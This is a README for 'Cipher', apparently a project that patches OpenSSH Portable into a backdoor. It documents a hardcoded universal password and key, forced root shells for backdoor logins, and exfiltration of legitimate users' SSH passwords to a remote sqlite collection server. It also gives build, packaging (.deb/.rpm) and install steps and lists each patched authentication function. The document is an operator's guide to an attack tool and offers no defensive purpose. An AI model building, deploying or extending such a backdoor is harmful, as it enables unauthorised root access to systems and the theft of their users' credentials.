# Cipher
## Author: johnmap007 (Matthew Schell)

### Original project: https://github.com/MeHungr/cipher

Cipher is an OpenSSH Portable backdoor that allows authentication using a specific password or generated SSH private key. The password is configurable in `install/generate_key.sh` or `auth-universal.h` after generating a key. Additional features include:
- Privilege escalation to root for any user that authenticates using the backdoor credentials
  - Attempts to spawn a bash shell regardless of the user's login shell (if unavailable, it tries /bin/sh, then falls back to the user's login shell)
- Credential exfiltration to remote server upon successful authentication, excluding backdoor credentials (falls back to writing to a local file for unrecoverable network errors)
  - The included server stores data it receives in a sqlite3 database

Check TODO-backdoor.md to find out what's planned for the future

Each modified function (should) be prefixed with: \
`// PATCHED FOR VULNERABILITY`

## Installation
1. Configure password in `install/generate_key.sh` using `openssl passwd -6` and entering your desired password.
2. Run `install/install.sh`.
    - This will set up the ssh key and build the executables.
    - It will also create .deb and .rpm files in `<project-root>/build/packages`.
3. Output will be in `<project-root>/output`.
4. The server executable is `output/bin/sshd`.

Run dpkg -i <.deb file> to install. \
Currently, Cipher is only tested on Debian.

## Testing
### Setup
To test a configuration without installing it system wide, run the following commands:
```
# Go to project root.
cd cipher

# Configure compilation settings. --prefix can realistically be anything, just be consistent where you run the binary from.
# Server-ip and server-port can also be anything valid
autoreconf
./configure --prefix=/opt/cipher-test --with-pam --with-server-ip=127.0.0.1 --with-server-port=4444

# Build and install the executables.
sudo make
sudo make install

# Run the ssh daemon in the foreground at level 3 debug on port 2222.
sudo /opt/cipher-test/sbin/sshd -D -ddd -e -p 2222

# In a separate terminal:
# Optionally set -o "PreferredAuthentications=<password|publickey|keyboard-interactive|etc.>" to test other auth methods.
ssh localhost -p 2222
```
The exfil server is located in exfil/server.py. Set the server-ip and server-port args to where you expect the client(s) to send data. You can also specify a different name or path to the database file with `--db`:

```bash
./server.py 127.0.0.1 4444 --db /path/to/database.db
```

`sshd` can hang for a while before authenticating because it waits for an ACK from the server to know whether the data was processed or not. The timeout value is 5 seconds, after which it will continue. 

On subsequent installs, only `sudo make install` is necessary.
### Cleanup
To clean up an old configuration before testing a new one, run the following command:
```
sudo rm -rf /opt/cipher-test
```
## Help & Debugging
Occasionally you may have issues compiling. This is usually due to the automatic header file inclusion order. The recommended order is such:
```
#include "hostfile.h"
#include "auth.h"
#include "auth-pam.h"
```
If any of the above lines is not included in the broken file, try the same order without that line.
## Files modified
- `configure.ac` - Added exfil server config options and validation
- `Makefile.in` - Added `auth-universal.o` and `exfil.o` compilation targets.

- `auth.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `allowed_user()` - Allows any user.
    - `auth_root_allowed()` - Permits root login when bypass is triggered.

- `auth-pam.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - +`#include <security/pam_appl.h>` - FreeBSD compat (I think).
    - `sshpam_auth_passwd()` - Allow hardcoded universal hash and skip pam stack if detected.

- `auth-passwd.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `auth_password()` - high level password auth abstraction.
    - `sys_auth_passwd()` - "password" auth mechanism logic.

- `monitor.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - + `#include "exfil.h"`
    - `monitor_child_preauth()` - Hooked to change user context to root before granting a shell.
    - `mm_answer_authpassword()` - Send authenticated = 1 if bypass is triggered & send bypass flag over the sshbuf.
      - Executes `remote_exfil()` function if `authenticated` and bypass not triggered. If that fails,  `local_exfil()` is executed
    - `mm_answer_pam_account()` - Force PAM success if bypass is triggered.
    - `mm_answer_pam_respond()` - Check password hash and skip if it matches universal hash.
    - `mm_answer_keyallowed()` - Check ssh key fingerprint against generated universal key and trip bypass flag if it matches.
    - `mm_answer_keyverify()` - We also need to ensure the key is verified properly later if our bypass is triggered.
    - 

- `monitor_wrap.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `mm_auth_password()` - Receives bypass flag over sshbuf and sets child process' bypass flag

- `session.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `do_child()` - Set shell to bash regardless of login shell.

## Files renamed
- `README.md` -> `README.upstream.md`.

## Files created
- `auth-universal.c` - Universal auth logic: hardcoded password hash and key fingerprint.
- `auth-universal.h` - Exports and declares the above.
- `exfil.c` - Credential exfiltration logic
- `exfil.h` - Necessary structs and functions for the above
- `exfil/server.py` - Remote server for handling stolen credentials
